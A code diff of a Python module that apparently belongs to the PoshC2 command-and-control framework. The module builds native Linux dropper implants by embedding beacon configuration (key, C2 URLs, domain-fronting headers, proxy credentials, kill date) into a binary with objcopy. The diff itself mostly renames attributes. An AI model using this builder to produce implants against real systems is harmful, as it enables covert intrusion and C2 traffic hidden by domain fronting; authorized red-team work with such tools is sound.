@@ -1,20 +1,20 @@
-'''
+"""
 
 Script to compile the Native Linux payloads
 
-'''
-from subprocess import Popen
+"""
 import time
 from datetime import datetime
+from subprocess import Popen
 from urllib.parse import urlparse
 
+from poshc2 import Colours
 from poshc2.server.Config import PayloadTemplatesDirectory, Jitter
-from poshc2.Colours import Colours
 
 
 def create_payloads(payloads, name):
-    payloads.QuickstartLog(Colours.END)
-    payloads.QuickstartLog("Linux files:")
+    payloads.quickstart_log(Colours.END)
+    payloads.quickstart_log("Linux files:")
 
     # Serialize our config data in a way that can be embedded into the resource section of the dropper binary
     # Arrays of items are represented by repeated keys (e.g. domain_front_header=header1.google.com\0domain_front_header=header2.google.com
@@ -26,8 +26,8 @@ def create_payloads(payloads, name):
 
     # The basic logic is to loop through each server that is set, and see if there's a matching domain front header.
     # If not, extract the netloc from the URL (e.g. the domain) and use that
-    servers = payloads.PayloadCommsHost.split(",")
-    domain_front_headers = payloads.DomainFrontHeader.split(",")
+    servers = payloads.payload_comms_host.split(",")
+    domain_front_headers = payloads.domain_front_header.split(",")
 
     host_headers = []
     for i in range(0, len(servers)):
@@ -44,21 +44,21 @@ def create_payloads(payloads, name):
             host_headers.append(domain_front_headers[i])
 
     mapping = {
-            "key=": payloads.Key,
-            "urlid=": payloads.URLID,
-            "url_suffix2=": payloads.ConnectURL+"?e",
-            "domain_front_hdr=": host_headers,
-            "server_clean=": payloads.PayloadCommsHost.split(","),
-            "ua=": payloads.UserAgent,
-            "proxy_url=": payloads.Proxyurl,
-            "proxy_user=": payloads.Proxyuser,
-            "proxy_pass=": payloads.Proxypass,
-            "urls=": payloads.AllBeaconURLs.split(","),
-            "jitter=": Jitter,
-            "sleep_time=": payloads.Sleep.replace("s", ""),
-            "kill_date=": int(time.mktime(datetime.strptime(payloads.KillDate, "%Y-%m-%d").timetuple())),
-            "icoimage=": payloads.AllBeaconImages.split(","),
-            }
+        "key=": payloads.encryption_key,
+        "urlid=": payloads.url_id,
+        "url_suffix2=": payloads.connect_url + "?e",
+        "domain_front_hdr=": host_headers,
+        "server_clean=": payloads.payload_comms_host.split(","),
+        "ua=": payloads.user_agent,
+        "proxy_url=": payloads.proxy_url,
+        "proxy_user=": payloads.proxy_user,
+        "proxy_pass=": payloads.proxy_password,
+        "urls=": payloads.all_beacon_urls.split(","),
+        "jitter=": Jitter,
+        "sleep_time=": payloads.sleep.replace("s", ""),
+        "kill_date=": int(time.mktime(datetime.strptime(payloads.kill_date, "%Y-%m-%d").timetuple())),
+        "icoimage=": payloads.all_beacon_images.split(","),
+    }
 
     config_string = ''
 
@@ -75,13 +75,15 @@ def create_payloads(payloads, name):
 
     config_string += "CONFIG_END\x00"
 
-    with open(f'{payloads.BaseDirectory}/linux_config.bin', 'w') as f:
+    with open(f'{payloads.output_directory}/linux_config.bin', 'w') as f:
         f.write(config_string)
 
-    proc = Popen(f'objcopy --update-section .configuration={payloads.BaseDirectory}/linux_config.bin {PayloadTemplatesDirectory}/dropper {payloads.BaseDirectory}{name}native_dropper', shell=True)
+    proc = Popen(
+        f'objcopy --update-section .configuration={payloads.output_directory}/linux_config.bin {PayloadTemplatesDirectory}/dropper {payloads.output_directory}{name}native_dropper',
+        shell=True)
     return_code = proc.wait()
 
     if return_code != 0:
-        payloads.QuickstartLog('Error creating native linux payload')
+        payloads.quickstart_log('Error creating native linux payload')
     else:
-        payloads.QuickstartLog(f'Linux dropper written to {payloads.BaseDirectory}{name}native_dropper')
+        payloads.quickstart_log(f'Linux dropper written to {payloads.output_directory}{name}native_dropper')
